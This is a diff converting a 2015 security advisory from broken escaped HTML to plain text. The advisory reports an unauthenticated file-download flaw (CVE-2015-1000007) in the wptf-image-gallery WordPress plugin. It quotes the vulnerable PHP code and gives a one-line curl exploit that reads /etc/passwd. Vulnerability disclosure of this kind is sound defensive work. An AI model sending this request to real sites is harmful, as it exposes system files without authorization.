@@ -1,29 +1,24 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 148&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Remote file download vulnerability in wptf-image-gallery v1.03&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-07-17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/wptf-image-gallery">https://wordpress.org/plugins/wptf-image-gallery</a>"&gt;<a href="https://wordpress.org/plugins/wptf-image-gallery&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/wptf-image-gallery&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;<a href="https://profiles.wordpress.org/sakush100/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://profiles.wordpress.org/sakush100/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 0000-00-00&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:plugins@wordpress.org">plugins@wordpress.org</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;WordPress True Fullscreen (WPTF) Gallery is a modern gallery plugin that supports true fullscreen and have a lot of features built with it.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;  The ./wptf-image-gallery/lib-mbox/ajax_load.php code doesn&amp;#039;t sanitize user input or check that a user is authorized to download files.  This allows an unauthenticated user to download sensitive system files: 
-</p>
-<p>  1 &amp;lt;?php<br/>
-  2 error_reporting(0);<br/>
-  3 $homepage = file_get_contents($<u>GET[&amp;#039;url&amp;#039;]);
-  4 $homepage = str</u>replace(&amp;quot;script&amp;quot;, &amp;quot;mboxdisablescript&amp;quot;, $homepage);
-  5 $homepage = str_replace(&amp;quot;SCRIPT&amp;quot;, &amp;quot;mboxdisablescript&amp;quot;, $homepage);
-  6 echo $homepage;<br/>
-  7 ?&amp;gt;<br/>
-&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-1000007&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=148"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ curl http&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;//<a href="http://www.example.com/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=/etc/passwd&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">www.example.com/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=/etc/passwd&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapidlabs.com/advisory.php?v=148">http://www.vapidlabs.com/advisory.php?v=148</a>"&gt;<a href="http://www.vapidlabs.com/advisory.php?v=148&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapidlabs.com/advisory.php?v=148&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                               Advisory #: 148
+Title: Remote file download vulnerability in wptf-image-gallery v1.03
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-07-17
+Download Site: https://wordpress.org/plugins/wptf-image-gallery
+Vendor:https://profiles.wordpress.org/sakush100/
+Vendor Notified: 0000-00-00
+Vendor Contact: plugins@wordpress.org
+Description: WordPress True Fullscreen (WPTF) Gallery is a modern gallery
+plugin that supports true fullscreen and have a lot of features built with it.
+Vulnerability:
+The ./wptf-image-gallery/lib-mbox/ajax_load.php code doesn't sanitize user
+input or check that a user is authorized to download files. This allows an
+unauthenticated user to download sensitive system files: 1 <?php 2
+error_reporting(0); 3 $homepage = file_get_contents($_GET['url']); 4 $homepage
+= str_replace("script", "mboxdisablescript", $homepage); 5 $homepage =
+str_replace("SCRIPT", "mboxdisablescript", $homepage); 6 echo $homepage; 7 ?>
+CVE-2015-1000007
+JSON:Export
+Exploit Code:
+   1. $ curl http://www.example.com/wp-content/plugins/wptf-image-gallery/lib-
+      mbox/ajax_load.php?url=/etc/passwd
+Screen Shots:
+Advisory: http://www.vapidlabs.com/advisory.php?v=148
